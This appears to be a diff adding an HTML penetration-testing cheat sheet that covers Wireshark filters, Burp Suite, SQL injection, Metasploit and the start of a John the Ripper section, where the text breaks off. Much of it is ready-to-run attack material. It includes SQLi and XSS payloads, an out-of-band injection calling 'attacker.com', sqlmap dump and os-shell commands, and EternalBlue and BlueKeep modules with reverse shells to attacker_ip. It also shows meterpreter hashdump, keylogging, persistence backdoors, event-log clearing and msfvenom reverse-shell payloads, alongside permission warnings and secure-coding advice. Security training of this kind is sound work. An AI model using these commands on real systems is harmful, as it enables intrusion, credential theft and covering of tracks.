+            <pre><code class="language-bash"># AND operator (both conditions)
+ip.addr == 192.168.1.100 && tcp.port == 80
+
+# OR operator (either condition)
+tcp.port == 80 || tcp.port == 443
+
+# NOT operator (exclude)
+!ip.addr == 192.168.1.1
+
+# Complex filter
+ip.addr == 192.168.1.100 && (tcp.port == 80 || tcp.port == 443) && http
+
+# Filter by TCP flags
+tcp.flags.syn == 1 && tcp.flags.ack == 0    # SYN only (connection start)
+tcp.flags.syn == 1 && tcp.flags.ack == 1    # SYN-ACK (server response)
+tcp.flags.reset == 1                         # RST packets (connection reset)
+tcp.flags.fin == 1                           # FIN packets (connection end)
+
+# HTTP specific
+http.request                                 # All HTTP requests
+http.response                                # All HTTP responses
+http.response.code == 404                    # 404 errors
+http.request.uri contains "admin"            # URLs with "admin"</code></pre>
+            
+            <h3>Following Streams</h3>
+            <pre><code class="language-bash"># Right-click packet → Follow → TCP Stream
+# Shows complete conversation between client and server
+
+# Filter for specific stream
+tcp.stream eq 0
+tcp.stream eq 1
+
+# View specific stream direction
+tcp.stream eq 0 && ip.src == 192.168.1.100
+
+# tshark command-line equivalent
+tshark -r capture.pcap -q -z follow,tcp,ascii,0</code></pre>
+            
+            <h3>Security Analysis Examples</h3>
+            <div class="card">
+                <div class="card-title">Detecting Suspicious Activity</div>
+                <pre><code class="language-bash"># Port scan detection - Many SYN packets to different ports
+tcp.flags.syn == 1 && tcp.flags.ack == 0
+
+# Detect password in cleartext
+frame contains "password" || frame contains "passwd" || frame contains "pass="
+
+# SQL injection attempts in HTTP
+http.request.uri contains "SELECT" || http.request.uri contains "UNION" || http.request.uri contains "' OR "
+
+# Large data exfiltration
+tcp.payload && frame.len > 1000
+
+# Brute force attempts - Many failed logins
+http.response.code == 401 || http.response.code == 403
+
+# Detect malware communication (beaconing)
+# Look for regular timing patterns in connections
+dns.qry.name contains "malware" || dns.qry.name matches "\\w{10,}\\.(com|net|org)"
+
+# SMB traffic (potential lateral movement)
+tcp.port == 445 || tcp.port == 139
+
+# Detect ARP spoofing
+arp.duplicate-address-detected || arp.duplicate-address-frame</code></pre>
+            </div>
+            
+            <h3>tshark - Command Line Wireshark</h3>
+            <pre><code class="language-bash"># Capture from interface
+tshark -i eth0
+
+# Capture with filter
+tshark -i eth0 -f "port 80"
+
+# Read pcap file
+tshark -r capture.pcap
+
+# Apply display filter
+tshark -r capture.pcap -Y "http.request"
+
+# Extract specific fields
+tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port
+
+# Export HTTP objects
+tshark -r capture.pcap --export-objects http,./http_objects
+
+# Statistics
+tshark -r capture.pcap -q -z conv,tcp    # TCP conversations
+tshark -r capture.pcap -q -z io,phs      # Protocol hierarchy
+
+# Write to file
+tshark -i eth0 -w output.pcap -c 1000    # Capture 1000 packets</code></pre>
+            
+            <div class="warning-box">
+                <div>
+                    <strong>Important:</strong> Capturing network traffic may capture sensitive information (passwords, cookies, personal data). Only capture traffic on networks you own or have explicit permission to analyze. Always handle captured data responsibly and delete it when no longer needed.
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 4: Burp Suite -->
+        <section class="section">
+            <h2><span class="icon">🔨</span> Burp Suite - Web Application Security Testing</h2>
+            
+            <div class="tool-header">
+                <div class="tool-name">🔨 Burp Suite</div>
+                <div class="tool-meta">
+                    <span>Web Testing</span>
+                    <span>Intercepting Proxy</span>
+                    <span>Vulnerability Scanner</span>
+                </div>
+            </div>
+            
+            <p>Burp Suite is the world's most widely used web application security testing tool. It combines an intercepting proxy, scanner, and various tools for testing web application security.</p>
+            
+            <h3>Setting Up Burp Suite</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    BURP SUITE SETUP WORKFLOW                                 │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   STEP 1: Configure Browser Proxy                                           │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │  Firefox: Settings → Network → Manual Proxy                        │   │
+│   │           HTTP Proxy: 127.0.0.1  Port: 8080                        │   │
+│   │           ✓ Use this proxy for all protocols                       │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+│   STEP 2: Install CA Certificate                                            │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │  1. Open browser to http://burp                                     │   │
+│   │  2. Click "CA Certificate" link                                     │   │
+│   │  3. Save and import certificate                                     │   │
+│   │  4. Trust for websites                                              │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+│   STEP 3: Configure Burp Proxy                                              │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │  Proxy → Options → Proxy Listeners                                  │   │
+│   │  ✓ Running on 127.0.0.1:8080                                       │   │
+│   │  ✓ Intercept is on (in Intercept tab)                              │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+│   ALTERNATIVE: Use FoxyProxy Extension                                      │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │  Install FoxyProxy in browser                                       │   │
+│   │  Add proxy: 127.0.0.1:8080                                          │   │
+│   │  Toggle on/off easily                                               │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Core Tools Overview</h3>
+            <table>
+                <tr>
+                    <th>Tool</th>
+                    <th>Purpose</th>
+                    <th>Common Use</th>
+                </tr>
+                <tr>
+                    <td><strong>Proxy</strong></td>
+                    <td>Intercept and modify HTTP traffic</td>
+                    <td>Capture requests, modify parameters, test input validation</td>
+                </tr>
+                <tr>
+                    <td><strong>Target</strong></td>
+                    <td>Site map and scope management</td>
+                    <td>Define target scope, view site structure</td>
+                </tr>
+                <tr>
+                    <td><strong>Spider</strong></td>
+                    <td>Automatic crawling</td>
+                    <td>Discover hidden pages and endpoints</td>
+                </tr>
+                <tr>
+                    <td><strong>Scanner</strong></td>
+                    <td>Automated vulnerability scanning</td>
+                    <td>Find SQLi, XSS, and other vulnerabilities</td>
+                </tr>
+                <tr>
+                    <td><strong>Intruder</strong></td>
+                    <td>Automated customized attacks</td>
+                    <td>Fuzzing, brute force, parameter discovery</td>
+                </tr>
+                <tr>
+                    <td><strong>Repeater</strong></td>
+                    <td>Manual request modification</td>
+                    <td>Test and verify vulnerabilities manually</td>
+                </tr>
+                <tr>
+                    <td><strong>Sequencer</strong></td>
+                    <td>Token randomness analysis</td>
+                    <td>Test session token strength</td>
+                </tr>
+                <tr>
+                    <td><strong>Decoder</strong></td>
+                    <td>Encode/decode data</td>
+                    <td>URL encode, Base64, hex conversion</td>
+                </tr>
+                <tr>
+                    <td><strong>Comparer</strong></td>
+                    <td>Compare requests/responses</td>
+                    <td>Find differences in responses</td>
+                </tr>
+            </table>
+            
+            <h3>Proxy - Intercepting Requests</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Intercept Features</div>
+                    <ul>
+                        <li><strong>Forward</strong> - Send request to server</li>
+                        <li><strong>Drop</strong> - Discard the request</li>
+                        <li><strong>Intercept is on/off</strong> - Toggle interception</li>
+                        <li><strong>Action</strong> - Send to other tools</li>
+                        <li><strong>Request/Response tabs</strong> - View both sides</li>
+                    </ul>
+                    <pre><code class="language-bash"># Keyboard shortcuts
+Ctrl+R    # Send to Repeater
+Ctrl+I    # Send to Intruder
+Ctrl+F    # Forward request
+Ctrl+D    # Drop request</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Modifying Requests</div>
+                    <pre><code class="language-html"># Original request
+POST /login HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=test
+
+# Modify to test SQL injection
+username=admin' OR '1'='1'--&password=test
+
+# Modify for IDOR
+GET /api/users/123/profile
+# Change to:
+GET /api/users/456/profile</code></pre>
+                </div>
+            </div>
+            
+            <h3>Intruder - Automated Attacks</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    INTRUDER ATTACK TYPES                                     │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   1. SNIPER - Single position, single payload set                           │
+│      ┌───────────────────────────────────────────────────────────────────┐  │
+│      │ Request: username=§admin§&password=test                           │  │
+│      │ Payload: [admin, root, test, user, administrator]                 │  │
+│      │ Results: 5 requests (each payload in position)                    │  │
+│      └───────────────────────────────────────────────────────────────────┘  │
+│                                                                              │
+│   2. BATTERING RAM - Single payload, multiple positions                     │
+│      ┌───────────────────────────────────────────────────────────────────┐  │
+│      │ Request: username=§admin§&password=§admin§                        │  │
+│      │ Same payload goes to ALL positions                                │  │
+│      └───────────────────────────────────────────────────────────────────┘  │
+│                                                                              │
+│   3. PITCHFORK - Multiple positions, parallel payload sets                  │
+│      ┌───────────────────────────────────────────────────────────────────┐  │
+│      │ Request: username=§user§&password=§pass§                          │  │
+│      │ Set 1: [admin, root, user]                                        │  │
+│      │ Set 2: [admin123, root123, user123]                               │  │
+│      │ Results: admin:admin123, root:root123, user:user123              │  │
+│      └───────────────────────────────────────────────────────────────────┘  │
+│                                                                              │
+│   4. CLUSTER BOMB - Multiple positions, all combinations                    │
+│      ┌───────────────────────────────────────────────────────────────────┐  │
+│      │ Request: username=§user§&password=§pass§                          │  │
+│      │ Set 1: [admin, root]           # 2 usernames                     │  │
+│      │ Set 2: [123, 456, 789]         # 3 passwords                     │  │
+│      │ Results: 2 x 3 = 6 requests (all combinations)                   │  │
+│      └───────────────────────────────────────────────────────────────────┘  │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+            
+            <pre><code class="language-bash"># Intruder Workflow
+1. Send request to Intruder (Ctrl+I)
+2. Positions tab: Select payload positions with §
+3. Payloads tab: Configure payload sets
+4. Options tab: Grep Extract, Redirections
+5. Start attack
+
+# Useful Payload Lists
+# /usr/share/seclists/Passwords/
+# /usr/share/seclists/Usernames/
+# /usr/share/wordlists/dirb/common.txt
+
+# Grep-Match for Success Indicators
+# - "Welcome" or "Dashboard" (successful login)
+# - "Invalid" or "Error" (failed attempt)
+# - HTTP status codes (200 vs 401 vs 403)</code></pre>
+            
+            <h3>Repeater - Manual Testing</h3>
+            <div class="card">
+                <div class="card-title">Common Repeater Use Cases</div>
+                <pre><code class="language-html"># Testing SQL Injection
+GET /products?id=1
+GET /products?id=1'
+GET /products?id=1 OR 1=1
+GET /products?id=1 UNION SELECT NULL--
+
+# Testing XSS
+GET /search?q=test
+GET /search?q=<script>alert(1)</script>
+GET /search?q="><script>alert(1)</script>
+GET /search?q=<img src=x onerror=alert(1)>
+
+# Testing IDOR
+GET /api/documents/1001
+GET /api/documents/1002
+GET /api/documents/1003
+
+# Testing Authorization
+# Request as admin user
+GET /admin/users
+# Change session cookie to regular user
+# Should be access denied
+
+# Testing Parameter Tampering
+POST /checkout
+price=99.99
+# Modify to:
+price=0.01</code></pre>
+            </div>
+            
+            <h3>Burp Extensions</h3>
+            <div class="resources-grid">
+                <div class="resource-card">
+                    <div class="name">SQLiPy</div>
+                    <div class="desc">SQLMap integration for automated SQL injection</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Retire.js</div>
+                    <div class="desc">Detect vulnerable JavaScript libraries</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Autorize</div>
+                    <div class="desc">Test authorization bypass automatically</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Param Miner</div>
+                    <div class="desc">Discover hidden parameters</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">Turbo Intruder</div>
+                    <div class="desc">High-speed race condition testing</div>
+                </div>
+                <div class="resource-card">
+                    <div class="name">JS Link Finder</div>
+                    <div class="desc">Extract endpoints from JavaScript</div>
+                </div>
+            </div>
+            
+            <div class="tip-box">
+                <div>
+                    <strong>Pro Tip:</strong> Use the <strong>Logger++</strong> extension to log all requests/responses. The <strong>Copy As Python Requests</strong> extension helps create proof-of-concept scripts quickly. Always configure your target scope properly to avoid scanning unintended targets.
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 5: SQL Injection -->
+        <section class="section">
+            <h2><span class="icon">💉</span> SQL Injection Penetration Testing</h2>
+            
+            <div class="tool-header">
+                <div class="tool-name">💉 SQL Injection</div>
+                <div class="tool-meta">
+                    <span>Web Vulnerability</span>
+                    <span>Data Extraction</span>
+                    <span>Critical Severity</span>
+                </div>
+            </div>
+            
+            <p>SQL Injection (SQLi) is one of the most critical web application vulnerabilities. It allows attackers to interfere with database queries, potentially accessing, modifying, or deleting data.</p>
+            
+            <div class="warning-box">
+                <div>
+                    <strong>Critical:</strong> SQL Injection testing should ONLY be performed on applications you own or have explicit written permission to test. Unauthorized database access is a serious crime. Practice on legal platforms like PortSwigger Academy, HackTheBox, or your own lab environments.
+                </div>
+            </div>
+            
+            <h3>Types of SQL Injection</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                      SQL INJECTION TYPES                                     │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   1. IN-BAND SQLi (Most Common)                                              │
+│      ├── Error-based: Error messages reveal database info                   │
+│      │   Example: ' OR 1=1 --                                               │
+│      │                                                                       │
+│      └── UNION-based: Use UNION to extract data                             │
+│          Example: ' UNION SELECT username,password FROM users--             │
+│                                                                              │
+│   2. BLIND SQLi (No Visible Output)                                          │
+│      ├── Boolean-based: TRUE/FALSE conditions                               │
+│      │   Example: ' AND 1=1-- (different response than AND 1=2--)          │
+│      │                                                                       │
+│      └── Time-based: Response time indicates TRUE/FALSE                     │
+│          Example: ' AND SLEEP(5)--                                          │
+│                                                                              │
+│   3. OUT-OF-BAND SQLi (Rare)                                                 │
+│      └── Data exfiltration via DNS/HTTP requests                            │
+│          Example: '; EXEC master..xp_dirtree '//attacker.com'--             │
+│                                                                              │
+│   ┌─────────────────────────────────────────────────────────────────────┐   │
+│   │                      ATTACK FLOW                                     │   │
+│   │                                                                       │   │
+│   │   [Find Injection] → [Determine Type] → [Extract Data]              │   │
+│   │         ↓                    ↓                    ↓                  │   │
+│   │   Test parameters      Error? Union?       Database, Tables,        │   │
+│   │   with payloads        Blind? OOB?         Columns, Data            │   │
+│   └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Manual SQL Injection Testing</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Detection Payloads</div>
+                    <pre><code class="language-sql">'           # Single quote
+"           # Double quote
+' OR '1'='1 # Always true
+' OR 1=1--  # Comment rest
+' OR 1=1#   # MySQL comment
+' OR 'x'='x # String comparison
+1 OR 1=1    # Numeric injection
+1 AND 1=1   # Test for injection
+1 AND 1=2   # Should differ if vulnerable</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Database Fingerprinting</div>
+                    <pre><code class="language-sql"># MySQL
+' UNION SELECT @@version--
+' UNION SELECT version()--
+
+# SQL Server
+' UNION SELECT @@version--
+
+# PostgreSQL
+' UNION SELECT version()--
+
+# Oracle
+' UNION SELECT banner FROM v$version--
+' UNION SELECT * FROM v$version--
+
+# SQLite
+' UNION SELECT sqlite_version()--</code></pre>
+                </div>
+            </div>
+            
+            <h3>UNION-Based Injection</h3>
+            <pre><code class="language-sql"># Step 1: Determine number of columns
+' ORDER BY 1--    # Works
+' ORDER BY 5--    # Works
+' ORDER BY 6--    # Error = 5 columns
+
+# Step 2: Find injectable columns
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT NULL,'test',NULL,NULL,NULL--
+
+# Step 3: Extract database info (MySQL)
+' UNION SELECT 1,database(),user(),version(),5--
+
+# Step 4: List tables
+' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()--
+
+# Step 5: List columns
+' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--
+
+# Step 6: Extract data
+' UNION SELECT 1,username,password,4,5 FROM users--</code></pre>
+            
+            <h3>Blind SQL Injection</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Boolean-Based Blind</div>
+                    <pre><code class="language-sql"># Test if vulnerable
+' AND 1=1--   # Normal response
+' AND 1=2--   # Different response
+
+# Extract database name length
+' AND LENGTH(database())>1--
+' AND LENGTH(database())>5--
+' AND LENGTH(database())=8--
+
+# Extract database name character by character
+' AND ASCII(SUBSTRING(database(),1,1))>97--
+' AND ASCII(SUBSTRING(database(),1,1))=115--
+# 115 = 's'
+
+# Extract data
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>10--</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Time-Based Blind</div>
+                    <pre><code class="language-sql"># MySQL
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+
+# SQL Server
+' WAITFOR DELAY '0:0:5'--
+' IF (1=1) WAITFOR DELAY '0:0:5'--
+
+# PostgreSQL
+' AND pg_sleep(5)--
+
+# Oracle
+' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
+
+# Conditional time delay
+' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--</code></pre>
+                </div>
+            </div>
+            
+            <h3>SQLMap - Automated SQL Injection</h3>
+            <pre><code class="language-bash"># Basic usage
+sqlmap -u "http://target.com/page?id=1"
+
+# Specify parameter
+sqlmap -u "http://target.com/page?id=1&cat=2" -p id
+
+# POST request
+sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
+
+# With cookie
+sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
+
+# Specify technique
+sqlmap -u "http://target.com/page?id=1" --technique=U  # UNION
+sqlmap -u "http://target.com/page?id=1" --technique=B  # Boolean blind
+sqlmap -u "http://target.com/page?id=1" --technique=T  # Time-based blind
+
+# Enumerate databases
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Enumerate tables
+sqlmap -u "http://target.com/page?id=1" -D database_name --tables
+
+# Enumerate columns
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users --columns
+
+# Dump data
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
+
+# Dump specific columns
+sqlmap -u "http://target.com/page?id=1" -D database_name -T users -C username,password --dump
+
+# Use tamper scripts (WAF bypass)
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between
+
+# Risk and level
+sqlmap -u "http://target.com/page?id=1" --risk=3 --level=5
+
+# Read files (MySQL with file privilege)
+sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
+
+# OS shell (specific conditions)
+sqlmap -u "http://target.com/page?id=1" --os-shell</code></pre>
+            
+            <h3>SQL Injection Prevention</h3>
+            <div class="card">
+                <div class="card-title">Secure Coding Practices</div>
+                <pre><code class="language-python"># BAD - Vulnerable to SQLi
+query = f"SELECT * FROM users WHERE id = {user_input}"
+cursor.execute(query)
+
+# GOOD - Parameterized queries (Prepared Statements)
+query = "SELECT * FROM users WHERE id = ?"
+cursor.execute(query, (user_input,))
+
+# Python with SQLAlchemy
+from sqlalchemy import text
+query = text("SELECT * FROM users WHERE id = :id")
+result = db.execute(query, {"id": user_input})
+
+# PHP Prepared Statement
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
+$stmt->execute([$user_input]);
+
+# Java Prepared Statement
+String query = "SELECT * FROM users WHERE id = ?";
+PreparedStatement stmt = conn.prepareStatement(query);
+stmt.setString(1, user_input);
+
+# Additional protections:
+# 1. Input validation (whitelist allowed characters)
+# 2. Least privilege database accounts
+# 3. Web Application Firewall (WAF)
+# 4. Error handling (don't expose DB errors)
+# 5. Regular security audits</code></pre>
+            </div>
+        </section>
+
+        <!-- Section 6: Metasploit -->
+        <section class="section">
+            <h2><span class="icon">💀</span> Metasploit Framework</h2>
+            
+            <div class="tool-header">
+                <div class="tool-name">💀 Metasploit</div>
+                <div class="tool-meta">
+                    <span>Exploitation Framework</span>
+                    <span>Post-Exploitation</span>
+                    <span>Payload Generator</span>
+                </div>
+            </div>
+            
+            <p>Metasploit Framework is the world's most used penetration testing framework. It provides tools for developing and executing exploit code against remote targets.</p>
+            
+            <h3>Getting Started with Metasploit</h3>
+            <pre><code class="language-bash"># Start Metasploit Console
+msfconsole
+
+# Initialize database (first time)
+msfdb init
+
+# Check database connection
+db_status
+
+# Get help
+help
+help exploit
+
+# Common msfconsole commands
+show exploits      # List all exploits
+show payloads      # List all payloads
+show auxiliary     # List auxiliary modules
+show encoders      # List encoders
+show nops          # List NOP generators
+
+# Search for modules
+search ssh
+search type:exploit platform:linux
+search cve:2021
+search name:smb
+
+# Workspaces (organize projects)
+workspace -a project1    # Add workspace
+workspace project1       # Switch workspace
+workspace -d project1    # Delete workspace</code></pre>
+            
+            <h3>Exploitation Workflow</h3>
+            <div class="ascii-box">
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    METASPLOIT EXPLOITATION WORKFLOW                          │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│   ┌────────────────┐                                                         │
+│   │  1. SELECT     │  msf6 > use exploit/windows/smb/ms17_010_eternalblue  │
+│   │     EXPLOIT    │                                                         │
+│   └───────┬────────┘                                                         │
+│           │                                                                  │
+│           ▼                                                                  │
+│   ┌────────────────┐                                                         │
+│   │  2. CONFIGURE  │  msf6 exploit(...) > set RHOSTS 192.168.1.100          │
+│   │     OPTIONS    │  msf6 exploit(...) > set LHOST 192.168.1.50            │
+│   └───────┬────────┘  msf6 exploit(...) > set PAYLOAD windows/meterpreter/..│
+│           │                                                                  │
+│           ▼                                                                  │
+│   ┌────────────────┐                                                         │
+│   │  3. VERIFY     │  msf6 exploit(...) > show options                       │
+│   │     SETTINGS   │  msf6 exploit(...) > check                              │
+│   └───────┬────────┘                                                         │
+│           │                                                                  │
+│           ▼                                                                  │
+│   ┌────────────────┐                                                         │
+│   │  4. EXECUTE    │  msf6 exploit(...) > exploit                            │
+│   │     EXPLOIT    │  or: run                                                │
+│   └───────┬────────┘                                                         │
+│           │                                                                  │
+│           ▼                                                                  │
+│   ┌────────────────┐                                                         │
+│   │  5. POST-      │  meterpreter > sysinfo                                  │
+│   │     EXPLOIT    │  meterpreter > hashdump                                 │
+│   └────────────────┘                                                         │
+│                                                                              │
+└─────────────────────────────────────────────────────────────────────────────┘</div>
+            
+            <h3>Common Exploits</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">SMB Exploits (Windows)</div>
+                    <pre><code class="language-bash"># EternalBlue (MS17-010)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS target_ip
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST attacker_ip
+exploit
+
+# BlueKeep (CVE-2019-0708)
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS target_ip
+set LHOST attacker_ip
+exploit
+
+# PSExec (Valid Credentials)
+use exploit/windows/smb/psexec
+set RHOSTS target_ip
+set SMBUser admin
+set SMBPass password
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST attacker_ip
+exploit</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">SSH Exploits (Linux)</div>
+                    <pre><code class="language-bash"># SSH Login (Brute Force)
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS target_ip
+set USER_FILE users.txt
+set PASS_FILE passwords.txt
+set STOP_ON_SUCCESS true
+run
+
+# SSH Exec (Valid Credentials)
+use exploit/multi/ssh/sshexec
+set RHOST target_ip
+set USERNAME user
+set PASSWORD pass
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST attacker_ip
+exploit</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Apache/PHP Exploits</div>
+                    <pre><code class="language-bash"># PHPmeterpreter (Upload PHP shell)
+use exploit/multi/http/phpmeterpreter
+set RHOSTS target_ip
+set LHOST attacker_ip
+exploit
+
+# Apache mod_cgi (Shellshock)
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOSTS target_ip
+set TARGETURI /cgi-bin/vulnerable.cgi
+set LHOST attacker_ip
+exploit</code></pre>
+                </div>
+                
+                <div class="card">
+                    <div class="card-title">Web Application Exploits</div>
+                    <pre><code class="language-bash"># Tomcat Manager Login
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS target_ip
+set HttpUsername tomcat
+set HttpPassword tomcat
+set LHOST attacker_ip
+exploit
+
+# Jenkins Script Console
+use exploit/multi/http/jenkins_script_console
+set RHOSTS target_ip
+set LHOST attacker_ip
+exploit</code></pre>
+                </div>
+            </div>
+            
+            <h3>Meterpreter - Post-Exploitation</h3>
+            <pre><code class="language-bash"># System Information
+sysinfo                    # OS and system info
+getuid                     # Current user
+getpid                     # Current process ID
+ps                         # List processes
+pwd                        # Current directory
+
+# File System
+ls                         # List files
+cd /path                   # Change directory
+download file.txt          # Download file
+upload payload.exe         # Upload file
+cat file.txt               # View file content
+edit file.txt              # Edit file
+
+# Networking
+ipconfig                   # Network interfaces
+route                      # Routing table
+netstat                    # Network connections
+portfwd add -l 8080 -p 80 -r 192.168.1.100  # Port forward
+
+# Privilege Escalation
+getsystem                  # Attempt privilege escalation
+getprivs                   # Enable all privileges
+hashdump                   # Dump password hashes
+
+# Process Management
+migrate PID                # Migrate to another process
+execute -f cmd.exe -i -H   # Execute hidden command shell
+kill PID                   # Kill process
+
+# Persistence
+run persistence -U -i 10 -p 4444 -r attacker_ip  # Install backdoor
+
+# Pivoting
+run autoroute -s 10.10.10.0/24   # Add route through session
+run autoroute -p                  # Print routes
+
+# Information Gathering
+run post/multi/gather/env
+run post/windows/gather/enum_applications
+run post/windows/gather/enum_system
+run post/multi/recon/local_exploit_suggester
+
+# Screen Capture
+screenshot                 # Take screenshot
+keyscan_start              # Start keylogger
+keyscan_dump               # Dump keystrokes
+keyscan_stop               # Stop keylogger
+
+# Cleanup
+clearev                    # Clear event logs</code></pre>
+            
+            <h3>msfvenom - Payload Generation</h3>
+            <pre><code class="language-bash"># List payloads
+msfvenom -l payloads
+
+# List formats
+msfvenom -l formats
+
+# Windows Executable
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o shell.exe
+
+# Windows Executable (Encoded)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
+
+# Linux Executable
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f elf -o shell.elf
+
+# PHP Web Shell
+msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw -o shell.php
+
+# ASP Web Shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f asp -o shell.asp
+
+# JSP Web Shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw -o shell.jsp
+
+# Python Script
+msfvenom -p cmd/unix/reverse_python LHOST=attacker_ip LPORT=4444 -f raw -o shell.py
+
+# Bash Reverse Shell
+msfvenom -p cmd/unix/reverse_bash LHOST=attacker_ip LPORT=4444 -f raw -o shell.sh
+
+# PowerShell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f psh -o shell.ps1
+
+# DLL
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o shell.dll</code></pre>
+            
+            <h3>Setting Up Listeners</h3>
+            <pre><code class="language-bash"># Multi Handler (for reverse shells)
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST attacker_ip
+set LPORT 4444
+exploit -j    # Run in background
+
+# Resource Script (save as handler.rc)
+# Use this for quick listener setup:
+cat > handler.rc << EOF
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit
+EOF
+
+# Run resource script
+msfconsole -r handler.rc</code></pre>
+            
+            <div class="tip-box">
+                <div>
+                    <strong>Pro Tip:</strong> Use <code>searchsploit</code> to find exploits outside Metasploit. Always use <code>check</code> command before running exploits when available. Set up a lab environment with Metasploitable or VulnHub VMs to practice safely.
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 7: John the Ripper -->
+        <section class="section">
+            <h2><span class="icon">🔓</span> John the Ripper - Password Cracking</h2>
+            
+            <div class="tool-header">
+                <div class="tool-name">🔓 John the Ripper</div>
+                <div class="tool-meta">
+                    <span>Password Cracker</span>
+                    <span>Hash Cracking</span>
+                    <span>Offline Attack</span>
+                </div>
+            </div>
+            
+            <p>John the Ripper (JtR) is a fast password cracker that combines multiple cracking modes and is available for many platforms. It's essential for security audits and penetration testing.</p>
+            
+            <h3>Installation</h3>
+            <pre><code class="language-bash"># Kali Linux (pre-installed)
+john --help
+
+# Ubuntu / Debian
+sudo apt install john
+
+# From source (recommended for GPU support)
+git clone https://github.com/openwall/john.git
+cd john/src
+./configure && make
+
+# Install jumbo version (more features)
+sudo apt install john-data
+
+# Verify installation
+john --list=build-info</code></pre>
+            
+            <h3>Supported Hash Types</h3>
+            <div class="grid">
+                <div class="card">
+                    <div class="card-title">Common Hash Formats</div>
+                    <pre><code class="language-bash"># List all supported formats
+john --list=formats
+
+# Common formats:
+# MD5          - raw-md5
+# SHA1         - raw-sha1
+# SHA256       - raw-sha256
+# SHA512       - raw-sha512
+# bcrypt       - bcrypt
+# NTLM         - nt
+# LM           - lm
+# MySQL        - mysql
+# PostgreSQL   - postgres
+# MSSQL        - mssql05
+# PDF          - pdf
+# ZIP          - zip
+# RAR          - rar
+# Office       - office</code></pre>
+                </div>
+                
+                <div class="card">
